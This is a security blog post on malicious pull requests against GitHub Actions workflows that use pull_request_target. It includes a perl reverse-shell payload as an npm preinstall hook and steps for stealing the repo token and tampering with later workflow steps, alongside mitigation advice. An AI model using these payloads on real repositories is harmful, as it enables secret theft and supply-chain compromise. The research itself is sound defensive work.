@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Github Actions and the threat of malicious pull requests - Nathan Davison</title>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+      <meta name="generator" content="GravCMS" />
+    <meta name="description" content="nathandavison.com" />
+  <link rel="shortcut icon" href="/user/themes/cacti/images/favicon.ico" />
+  <link rel="alternate" type="application/rss+xml" title="My Blog" href="/rss.xml">
+
+          
+      <link href="/user/themes/cacti/css/style.css" type="text/css" rel="stylesheet">
+<link href="/user/plugins/form/assets/form-styles.css" type="text/css" rel="stylesheet">
+<link href="/user/plugins/youtube/css/youtube.css" type="text/css" rel="stylesheet">
+<link href="/user/plugins/highlight/css/vs2015.css" type="text/css" rel="stylesheet">
+<link href="/user/plugins/featherlight/css/featherlight.min.css" type="text/css" rel="stylesheet">
+<link href="/user/plugins/login/css/login.css" type="text/css" rel="stylesheet">
+    
+  </head>
+<body>
+
+    <section id="navigation">
+
+    <nav class="main-nav">
+                                <a class="active" href="/">
+                <span class="arrow">←</span>                                 Blog
+            </a>
+                                <a class="" href="/contact">
+                                                contact
+            </a>
+                    </nav>
+    </section>
+
+    <section id="wrapper">
+                            
+        <div class="">
+            <article class="post">
+        <header>
+            <h1>Github Actions and the threat of malicious pull requests</h1>
+            <h2 class="headline">March 13, 2021</h2>
+        </header>
+        <section id="post-body">
+            <p><strong>12/04 update: I have put together a script which can be used to detect Github repos which have workflows that may be vulnerable here: <a href="https://gist.github.com/ndavison/d14dbbd9d015eeeef19b923ab80b1f1a">https://gist.github.com/ndavison/d14dbbd9d015eeeef19b923ab80b1f1a</a>. This can be tested against Github orgs or specific repos.</strong></p>
+<p>In my previous writeup, titled <a href="https://nathandavison.com/blog/shaking-secrets-out-of-circleci-builds">Shaking secrets out of CircleCI - insecure configuration and the threat of malicious pull requests</a>, I covered a somewhat frighteningly easy way to accidentally configure CircleCI projects in a vulnerable state, allowing pull requests to be submitted that steal tokens and secrets stored within the settings of a CircleCI project. Because CircleCI has deep integrations with Github, and Github doesn't allow public repositories to disable pull requests, such vulnerable configuration would mean a malicious actor could submit a PR at any time of the day, steal the secrets, and clean up behind them, without any interaction required by the repo admins or maintainers.</p>
+<p>In this writeup, I'm going to take this same threat - a malicious actor submitting a pull request with the intention of stealing secrets configured within a CI/CD pipeline - and show how it can be realised against a Github repository configured to use Github's own <a href="https://github.com/features/actions">Actions</a> feature. Like CircleCI, this is not a result of a vulnerability in the platform itself, but of vulnerable configuration by the repo owner.</p>
+<p>One key attribute of the CircleCI research was the fact a project would only become vulnerable if it was configured in a specific way, as controlled by a private admin configuration UI. While my research outlined ways for blackbox testers to determine with reasonable certainty that a project was configured in a vulnerable state, there was no way to be absolutely sure without actually performing the attack - that didn't mean a project wasn't vulnerable, it just meant finding the needle in the haystack with some sort of finesse was a bit tricky. In contrast, the threat I'm going to outline in this Github Actions research can be confirmed with much more confidence, as Github Actions workflows are configured in the open (for public repos at least), allowing anyone to take a copy of the config and test privately without raising any alarms.</p>
+<h2>The making of a malicious pull request vulnerability</h2>
+<p>With CircleCI, the feature at the core of the vulnerable configuration was the ability to define what happens when a pull request from a forked repository is submitted against your repository. More specifically, it was the ability to define what happens with your pipeline's configured secrets - API keys, authentication tokens, and the likes - when it executes a pipeline as a result of a pull request from a fork. When someone internal to your Github org submits a PR to a repo, you may want your pipeline to be able to use such secrets to do something privileged, like publish a binary or bundle to a repository. The question then becomes, what happens when someone who isn't internal or privileged in your Github org submits a PR? usually you would not want anything privileged to happen and therefore shouldn't need any credentials, however the use case for doing something privileged is obviously prevalent enough for CircleCI to accommodate it, as the settings detailed in my writeup suggest.</p>
+<p>This use case must have caught the attention of a product manager at Github as well, because Actions also supports the ability for pull requests from forked repos to trigger a pipeline with secrets provided. When Github first launched Actions in 2018, this was not the case (or at least, <a href="https://www.vladionescu.me/posts/how-i-became-a-hacker/">it wasn't intended to be</a>) - in Actions terminology, the <code>pull_request</code> event and its variants were the only events that triggered on a PR being opened from a fork, and these events were made to not have access to repo secrets, including having access to a <code>GITHUB_TOKEN</code> value that is read-only. However, sometime later, in August 2020, <a href="https://github.blog/2020-08-03-github-actions-improvements-for-fork-and-pull-request-workflows/">the <code>pull_request_target</code> event was added</a>. This event is given repo secrets and a full read/write <code>GITHUB_TOKEN</code> to boot, however there is a catch - this action only runs in the pull request's target branch, and not the pull request's branch itself. This differs from the CircleCI approach, which happily checked out the pull request's code when it was instructed to share secrets with PRs from forked repositories, including the pipeline configuration in the pull request.</p>
+<p>What this means is, the <code>pull_request_target</code> event does not use anything from the fork PR at all when executing the workflow configured against that action, it simply executes the (presumably safe) code and configuration already in the base repo. So unlike CircleCi, a malicious actor can't just submit a PR with the <code>pull_request_target</code> Actions configuration file tampered with to do something nasty, as that code is never used during the <code>pull_request_target</code> workflow.</p>
+<p>This sounds safe, and it is. The problem comes when people do something unsafe in their repo's <code>pull_request_target</code> configuration, which can basically be summarised as one crucial mistake: using <code>actions/checkout</code> to checkout the pull request's repo HEAD, and thus introducing potentially malicious code into the workflow. This mistake may sound unlikely, but it isn't exactly a rarity - I won't link to specific examples of vulnerable configurations in public repositories, but <a href="https://github.com/search?l=YAML&amp;q=pull_request_target%20actions%2Fcheckout&amp;type=Code">this Github code search may find some</a>, or at least some very near misses that were probably just lucky to escape being vulnerable. Despite the fact <a href="https://docs.github.com/en/actions/reference/events-that-trigger-workflows#pull_request_target">Github do reference avoiding this mistake in their documentation for pull_request_target actions in a bright red box</a>, you will likely have little trouble finding examples of repos making this mistake.</p>
+<h2>An example of vulnerable Github Actions pull_request_target configuration</h2>
+<p>While I won't link to a real world example of a vulnerable config, I will show what constitutes the bare minimal configuration to make a Github repo vulnerable to malicious pull requests using the <code>pull_request_target</code> action, and then breakdown what exactly makes it vulnerable. First, here's the example vulnerable configuration that allows an attacker to steal the secret <code>secrets.SOME_SECRET</code>:</p>
+<pre><code class="language-yml">name: my action
+on: pull_request_target
+
+jobs:
+  pr-check: 
+    name: Check PR
+    runs-on: ubuntu-latest
+    steps:
+      - name: Setup Action
+        uses: actions/checkout@v2
+        with:
+          ref: ${{github.event.pull_request.head.ref}}
+          repository: ${{github.event.pull_request.head.repo.full_name}}
+      - name: Setup Node
+        uses: actions/setup-node@v1
+        with:
+          node-version: 12.x
+      - name: Install dependencies
+        run: npm install
+      - name: some command
+        run: some_command
+        env:
+          SOME_SECRET: ${{ secrets.SOME_SECRET }}</code></pre>
+<p>Before jumping in to specifics, the very first thing that enables this configuration to become vulnerable is the <code>on: pull_request_target</code> part - this means the workflow being run is given access to secrets and a full read and write Github token. So, before everything else, for a repo to be vulnerable, it must have a workflow configured to run on the <code>pull_request_target</code> event.</p>
+<p>Now, onto analysing the vulnerable configuration. I will break it down in order:</p>
+<ol>
+<li>The primary mistake is using the <code>actions/checkout@v2</code> action to checkout the pull request's head, which it is doing with the <code>ref: ${{github.event.pull_request.head.ref}}</code> and <code>repository: ${{github.event.pull_request.head.repo.full_name}}</code> arguments. What this is effectively doing is configuring the workflow to now use the pull request's code for the rest of the workflow, which may be coming from a fork from a malicious actor.</li>
+<li>With that mistake made, the configuration is now vulnerable to exploitation. However, it still needs a vector, or a "sink", for a malicious pull request to target with arbitrary code execution. Can you spot it? yep, it's the rather innocent looking <code>npm install</code> command. I'll expand on why exactly this is a problem shortly, but for now, just know that this is where malicious code in the pull request executes.</li>
+<li>Now that the malicious code has had a chance to execute, any step run after it is compromised. The malicious code in this case may replace the binary <code>some_command</code> with something that reads the environment variables the workflow injects into the <code>some command</code> step, specifically <code>$SOME_SECRET</code>, and it's game over - the malicious pull request and hence malicious actor now has this secret.</li>
+</ol>
+<p>To elaborate on the second point, the part where the malicious code is executed in <code>npm install</code>, this can be achieved by abusing the <a href="https://docs.npmjs.com/cli/v7/using-npm/scripts">scripts feature with npm</a>. This is because, inside a <code>package.json</code> file, you can define shell commands in the <code>"scripts"</code> that execute during the lifecycle of the <code>npm install</code> process. For example, while researching this writeup, I found the following perl reverse shell payload (<code>$i</code> is the IP and <code>$p</code> is the port for your netcat listener) from the <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md#perl">PayloadsAllTheThings repo</a> to work a treat on the Actions <code>ubuntu-latest</code> image, which I have inserted as a npm "pre-install" script:</p>
+<pre><code class="language-js">...
+"scripts": {
+    "preinstall": "perl -e 'use Socket;$i=\"X.X.X.X\";$p=XXXX;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};'"
+}
+...</code></pre>
+<p>Remember, while the malicious pull request can't modify the workflow configuration itself, it can take advantage of the fact the unsafe <code>actions/checkout@v2</code> usage has checked out the potentially unsafe code that the rest of the workflow now uses, including the <code>Install dependencies</code> step in my example config. So all a malicious pull request needs to do is modify the repo's <code>package.json</code> file to include malicious code in one of the <code>"scripts"</code> hooks, and the <code>npm install</code> command later in the workflow will execute that malicious code. As mentioned in the last point, such malicious code could replace a binary used later in the workflow that is granted access to secrets, but the options don't stop there - I will cover some more exploitation options in the next section. At this stage, I will drive home one particular key point - <strong>in Github Actions, steps inside a job, while each their own process, all share the same filesystem</strong>. You would of course expect a CI/CD system to do this, but perhaps only for artifacts a stage produces for future stages such as a node_modules directory - not necessarily effectively the whole system, which appears to be how Actions works.</p>
+<p>One thing to keep in mind is the <code>npm install</code> step itself is not being used incorrectly, it's just the fact this allows file changes in the pull request's code to influence the Actions workflow that makes it a good target. Here are a few examples of other exploitable execution sinks I have encountered in the wild, all of which were found in a vulnerable <code>pull_request_target</code> + unsafe code checkout workflow:</p>
+<ol>
+<li>A faily common one is <code>pip install -r requirements.txt</code> or a similar pattern. This should allow an attacker to change which python packages are installed to point to one under their control, which should then allow for a post-install hook to be included in the malicious package's <code>setup.py</code> file.</li>
+<li>One vulnerable workflow used an action that asked for a "build-script" as an input, which the action would execute on the workflow's checked out code as a npm script. So, just because the workflow may not have a <code>npm install</code> step in plain sight doesn't mean the npm install hooks defined in <code>package.json</code> don't execute during the workflow.</li>
+<li>Workflows which execute a local script. This of course could be used in practically unlimited ways, but one example I saw a few times was a workflow which executed a local <a href="https://docs.gradle.org/current/userguide/gradle_wrapper.html">Gradle wrapper script</a>, often like <code>run: ./gradlew</code>.</li>
+<li>I have encountered Github actions repos (that is, code created to be used as an action in other workflows) that are themselves vulnerable, by having an otherwise vulnerable workflow with a <code>uses: ./</code> step, presumably intending to test the action that the repo hosts, being used as an action. What this means is a malicious PR could simply change the <code>action.yml</code> configuation or change the script that the configuration already points to in its <code>runs:</code> value, to execute malicious code with access to the read/write repo token. Targeting an action repo like this may be of particular interest to a malicious actor, as compromise could mean compromising many other repos that use the action in their workflows.</li>
+</ol>
+<p>These are just a few examples - the countless amount of actions available on Github from the community at large that you can import into your config means any one of them could offer a bespoke way to inject code in the PR which is executed by the workflow.</p>
+<p>Finally, the last point to make on this example configuration is the secrets are only exposed because the malicious execution happens in the <code>Install dependencies</code> step before it. If the <code>some command</code> step was defined before the <code>Install dependencies</code> step, then it would be safe (this is partly why I chose <code>npm install</code> as an example, as it is something you would expect to occur early in the workflow). Other than the obvious chronological reason, this is also because each stage in a workflow has its own process, and so environment variables defined for one stage are not available to another. There is, however, one notable exception to this - if you define variables at the <code>jobs:</code> level, then those <em>will</em> be made available to all stages in the job, including of course the stage executing malicious code. Also, while not an environment variable, the read/write <code>GITHUB_TOKEN</code> value will be available from inside the workflow regardless of whether secrets are being referenced, which I'll expand on shortly.</p>
+<h2>How to take advantage of code execution inside a Github Actions workflow</h2>
+<p>Now that I've covered how a repo can configure a <code>pull_request_target</code> in a way that creates a malicious pull request vulnerability, and touched on certain sinks an attacker may use to execute their malicious code, what are some ways the code could target steps in the workflow that come after the malicious code executes, keeping in mind that all steps inside a job share a filesystem? here is what I came up with:</p>
+<ol>
+<li>As already covered in the example vulnerable config, if a step uses a binary on the filesystem, malicious code could replace this binary with whatever it likes.</li>
+<li>The <code>/etc/resolv.conf</code> or <code>/etc/hosts</code> file could be modified to manipulate DNS results in the execution environment. If a step is using TLS, this could be combined with compromised DNS by adding an attacker controlled CA to the environment's trusted CA's, which means a step's network requests could be manipulated to query an attacker controlled server. The <code>runner</code> user that Actions steps are executed as (in the ubuntu-latest image at least) has password-less sudo access, so basically any configuration file on the filesystem is fair game.</li>
+<li>The <code>runner</code> user is also a member of the Docker group, so malicious Docker images can be added to the environment. This means any stage in the workflow which checks out a Docker image as an action could be compromised. This is because a workflow will create the Docker images before running any steps, so if malicious code replaces a Docker image that is used by a step later in the workflow with something else, the phony Docker image will be used instead.</li>
+<li>Even actions themselves in the form of <code>uses: actions/some_action@v1</code> can be replaced. Like Docker images, these are collected before any steps are executed and placed in the <code>/home/runner/work/_actions/</code> filesystem location.</li>
+<li>Or, if you don't actually care about interferring with a future step in the workflow, you could just steal the full read/write repo token from the filesystem. This lives in the git config file at <code>/home/runner/work/xxx/xxx/.git/config</code> on the step's filesystem, in the " extraheader" git configuration (or you could just execute <code>git config --get http.https://github.com/.extraheader</code>).</li>
+</ol>
+<p>There are probably many more avenues to exploit, these are really just the obvious ones you tend to think of when a compromised filesystem is in play. It's worth reiterating that steps in a workflow are only vulnerable to being manipulated if they come after the step which executes the malicious code - so in the example vulnerable configuration, this would be the <code>some command</code> step only, as the malicious code runs in the <code>Install dependencies</code> step.</p>
+<h2>How to not be vulnerable</h2>
+<p>Really, the answer to this is simple - if you're using the <code>pull_request_target</code> event in Github Actions, don't use <code>actions/checkout</code> to then checkout the pull request's code. If you do, then you are opening yourself up to the malicious pull request attack.</p>
+<p>If you must combine the two, then make sure you guard your configuration with conditions that only runs steps with access to secrets when the pull request being checked out in the workflow is trusted, whatever that means to you and your requirements. If you search Github, you will find configurations that use the <code>if:</code> feature to do something like this - be careful that your logic is not faulty and test, test, test. Use a non privileged account to fork the repo, and try and exploit it using the techniques covered.</p>
+<p>In the CircleCI research, I placed a small amount of blame on CircleCI due to what I considered a strange UI which made it very easy to accidentally enable vulnerable configuration, however in case of Github Actions, it isn't about a clumsy UI or even a configuration API that is not safe by default, but perhaps about a slight focus on usability and features rather than security. The need for a <code>pull_request_target</code> event which has privileged access to the base repo seems strong in the open source community, and there's only so much a platform can do to prevent configuration mistakes like this, but the way in which the steps in Actions work means if any of them happen to leave the door open for an attacker, the whole workflow thereafter is compromised thanks to the sharing of a filesystem, which doesn't seem ideal from a security perspective. Then of course you have easy sudo access, Docker access, and the fact images and actions are downloaded prior to any steps, rather than collected at run time (which may have made them harder to replace).</p>
+<p>All of this could be argued as an unfortunate side effect of a easy to use and flexible CI/CD platform, so perhaps detection is the next best option - detecting vulnerable Actions workflows is something that could be included in Github's automated security offering, like their service which notifies people when they commit secrets to public repos, or maybe it's something CodeQL could detect and notify for.</p>
+<p>After I had done this research, but before publishing this writeup, the Github doco for <code>pull_request_target</code> was <a href="https://github.com/github/docs/commit/a216cd500e397aa7930c7c39fbf80bbd3a159fc7#diff-28c026b10077d9070901105e06874a5b1d4dc5ef8c284f1d21526dab652f5034">updated</a> to <a href="https://securitylab.github.com/research/github-actions-preventing-pwn-requests">include a link to a blog post</a> covering this threat and some mitigation strategies (not to mention assigning this a cool vulnerability class name - pwn requests!). I didn't come across this blog post beforehand but, if I had, I may not have written this post, as frankly not a lot of what I covered here is adding much to that post, although bug hunters may find some value in my focus on how to potentially find vulnerable configs, and demonstrate impact.</p>
+<p>As mentioned in my CircleCI writeup, please be considerate if testing for this vulnerability - pull requests on public Github repos are of course open for everyone to see, and sending in a malicious PR, even for a program with a mature bug bounty program, is potentially exposing the target to genuine malicious actors who could take advantage before the target has time to act. My CircleCI writeup has suggestions for reporting this vulnerability to programs based on my own experience of doing so, and with Github Actions, there is really no excuse - just copy the workflow config to your own private repo and test there to confirm the vulnerability.</p>
+        </section>
+    </article>
+    <footer id="post-meta" class="clearfix">
+        <a href="http://twitter.com/nj_dav">
+            <img class="avatar" src="/user/themes/cacti/images/avatar.png">
+            <div>
+                <span class="dark">Nathan Davison</span>
+                <span>Blogging about web security stuff</span>
+            </div>
+        </a>
+
+        <section id="sharing">
+            <a class="twitter" href="https://twitter.com/intent/tweet?text=Github Actions and the threat of malicious pull requests by @nj_dav - http://localhost/blog/github-actions-and-the-threat-of-malicious-pull-requests"><span class="icon-twitter"> Tweet</span></a>
+<a class="facebook" href="#" onclick="
+    window.open(
+      'https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(location.href),
+      'facebook-share-dialog',
+      'width=626,height=436');
+    return false;"><span class="icon-facebook-rect"> Share</span>
+</a>
+        </section>
+    </footer>
+
+    <nav id="post-nav" class="clearfix">
+        
+                <span class="next">
+            <a href="/blog/shaking-secrets-out-of-circleci-builds">Shaking secrets out of CircleCI builds - insecure configuration and the threat of malicious pull requests <span class="arrow">→</span></a>
+        </span>
+            </nav>
+
+
+    <!-- Disqus comments -->
+    
+    <!-- Archive post list -->
+    
+            </div>
+
+                <footer id="footer">
+    <p class="small">© Copyright 2023</p>
+</footer>
+            </section>
+
+        
+                      
+      <script src="/assets/ab993aa8955cc9b4d8ab5a20cb172675.js"></script>
+<script>
+hljs.initHighlightingOnLoad();
+</script>
+<script>
+$(document).ready(function(){
+    $('a[rel="lightbox"]').featherlight({
+        openSpeed: 250,
+        closeSpeed: 250,
+        closeOnClick: 'background',
+        closeOnEsc: '1',
+        root: 'body'
+    });
+});
+</script>
+
+    
+  </body>
+</html>
